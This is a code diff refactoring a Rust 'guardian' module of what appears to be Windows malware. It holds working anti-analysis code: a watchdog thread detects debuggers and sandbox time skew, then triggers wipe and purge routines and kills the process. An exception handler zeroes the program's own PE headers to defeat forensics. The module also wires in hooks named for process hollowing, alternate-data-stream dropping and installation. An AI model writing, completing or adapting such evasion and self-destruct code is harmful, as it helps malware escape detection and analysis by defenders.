@@ -10,39 +10,50 @@
 #![allow(dead_code, non_snake_case, clippy::too_many_arguments)]
 
 use winapi::um::processthreadsapi::{
-    CreateThread, GetCurrentProcessId, OpenProcess,
-    PROCESS_INFORMATION,
-};
-use winapi::um::winnt::{
-    PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_READ,
-    MEM_COMMIT,
+    CreateThread, GetCurrentProcess,
 };
 use winapi::um::handleapi::CloseHandle;
-use winapi::um::synchapi::Sleep;
 use winapi::um::debugapi::IsDebuggerPresent;
-use winapi::shared::minwindef::{DWORD, BOOL, LPVOID, TRUE, FALSE};
+use winapi::shared::minwindef::{DWORD, LPVOID};
 
-// Type aliases for the function pointers passed from main.rs
-type FnNtqsi    = unsafe fn(usize, *mut u8, usize, *mut u32) -> i32;
-type FnSleep    = unsafe fn(u32);
-type FnTick     = unsafe fn() -> u32;
-type FnVoid     = unsafe fn();
-type FnBool     = unsafe fn() -> bool;
-type FnAddVeh   = unsafe fn(usize, *const u8) -> usize;
+// ── Public type aliases ────────────────────────────────────────────────────
+// These are pub so indirect_syscall.rs can reference crate::guardian::* for
+// the resolve_* return types without duplicating the signatures.
+
+/// NtQuerySystemInformation(SystemInformationClass, Buffer, Length, *ReturnLength)
+pub type NtQuerySystemInformation =
+    unsafe fn(usize, *mut u8, usize, *mut u32) -> i32;
+
+/// Sleep(dwMilliseconds)
+pub type Sleep = unsafe fn(u32);
+
+/// GetTickCount64() -> u64
+pub type GetTickCount64 = unsafe fn() -> u64;
+
+/// AddVectoredExceptionHandler(First, Handler) -> PVOID
+pub type AddVectoredExceptionHandler = unsafe fn(usize, *const u8) -> usize;
+
+// Private convenience aliases used only inside this module
+type FnNtqsi  = NtQuerySystemInformation;
+type FnSleep  = Sleep;
+type FnTick   = GetTickCount64;
+type FnAddVeh = AddVectoredExceptionHandler;
+type FnVoid   = unsafe fn();
+type FnBool   = unsafe fn() -> bool;
 
 // Shared state passed into the guardian thread via a heap-allocated box
 struct GuardState {
-    fn_ntqsi:      FnNtqsi,
-    fn_sleep:      FnSleep,
-    fn_tick:       FnTick,
-    fn_wipe:       FnVoid,
-    fn_purge:      FnVoid,
-    fn_drop_ads:   FnVoid,
-    fn_install:    FnVoid,
-    fn_hollow:     FnBool,
+    fn_ntqsi:    FnNtqsi,
+    fn_sleep:    FnSleep,
+    fn_tick:     FnTick,
+    fn_wipe:     FnVoid,
+    fn_purge:    FnVoid,
+    fn_drop_ads: FnVoid,
+    fn_install:  FnVoid,
+    fn_hollow:   FnBool,
 }
 
-/// The guardian thread body. Runs in a loop checking for debugger / parent kill.
+/// The guardian thread body. Runs in a loop checking for debugger / time skew.
 unsafe extern "system" fn guardian_thread(param: LPVOID) -> DWORD {
     let state = &*(param as *const GuardState);
     let check_interval_ms: u32 = 5_000;
@@ -54,16 +65,13 @@ unsafe extern "system" fn guardian_thread(param: LPVOID) -> DWORD {
         // Debugger check
         if IsDebuggerPresent() != 0 {
             (state.fn_wipe)();
-            winapi::um::processthreadsapi::TerminateProcess(
-                winapi::um::processthreadsapi::GetCurrentProcess(), 0,
-            );
+            winapi::um::processthreadsapi::TerminateProcess(GetCurrentProcess(), 0);
         }
 
         // Time-skew check (sleep took much longer than expected = sandbox)
         let ticks_now = (state.fn_tick)();
-        let elapsed = ticks_now.wrapping_sub(ticks_last);
+        let elapsed = ticks_now.wrapping_sub(ticks_last) as u32;
         ticks_last = ticks_now;
-        // If more than 4x the expected interval elapsed, assume time manipulation
         if elapsed > check_interval_ms * 4 {
             (state.fn_wipe)();
             (state.fn_purge)();
@@ -74,33 +82,22 @@ unsafe extern "system" fn guardian_thread(param: LPVOID) -> DWORD {
     }
 }
 
-/// VEH handler: on any unhandled exception, trigger wipe + terminate.
-/// The VEH receives a pointer to EXCEPTION_POINTERS; we ignore it and destruct.
+/// VEH handler: on any unhandled exception, zero PE headers and terminate.
 unsafe extern "system" fn veh_handler(_ex: LPVOID) -> i32 {
-    // Wipe the exe and terminate — best-effort forensic cleanup on crash
     let own_base: usize;
     core::arch::asm!("lea {b}, [rip]", b = out(reg) own_base);
-    let own_base = (own_base & !0xFFFF) as *const u8;
-    // Zero first 4KB (headers + entry stubs) to destroy PE signature
-    core::ptr::write_bytes(own_base as *mut u8, 0u8, 4096);
-    winapi::um::processthreadsapi::TerminateProcess(
-        winapi::um::processthreadsapi::GetCurrentProcess(), 1,
-    );
-    // EXCEPTION_CONTINUE_SEARCH = 0 (we won't reach here but compiler needs a return)
-    0
+    let own_base = (own_base & !0xFFFF) as *mut u8;
+    core::ptr::write_bytes(own_base, 0u8, 4096);
+    winapi::um::processthreadsapi::TerminateProcess(GetCurrentProcess(), 1);
+    0 // EXCEPTION_CONTINUE_SEARCH — unreachable but required
 }
 
-/// Install a Vectored Exception Handler using the resolved AddVectoredExceptionHandler
-/// function pointer from indirect_syscall.
-/// `fn_add_veh`: pointer to AddVectoredExceptionHandler(ULONG FirstHandler, PVECTORED_EXCEPTION_HANDLER)
+/// Install a Vectored Exception Handler using the resolved fn ptr.
 pub unsafe fn install_veh(fn_add_veh: FnAddVeh) {
-    // FirstHandler = 1 means called before other handlers
     (fn_add_veh)(1, veh_handler as *const u8);
 }
 
 /// Spawn the guardian watchdog thread.
-/// All function pointers are passed in from main.rs so this module stays
-/// free of direct inter-module dependencies that would break feature-gated builds.
 pub unsafe fn start_thread(
     fn_ntqsi:    FnNtqsi,
     fn_sleep:    FnSleep,
@@ -125,17 +122,14 @@ pub unsafe fn start_thread(
 
     let mut tid: DWORD = 0;
     let h = CreateThread(
-        core::ptr::null_mut(),
-        0,
-        Some(guardian_thread),
-        state_ptr,
-        0,
-        &mut tid,
+        core::ptr::null_mut(), 0,
+        Some(guardian_thread), state_ptr,
+        0, &mut tid,
     );
     if !h.is_null() {
         CloseHandle(h);
     } else {
-        // Thread creation failed — reclaim the Box to avoid leak
+        // Thread creation failed — reclaim Box to avoid leak
         let _ = Box::from_raw(state_ptr as *mut GuardState);
     }
 }
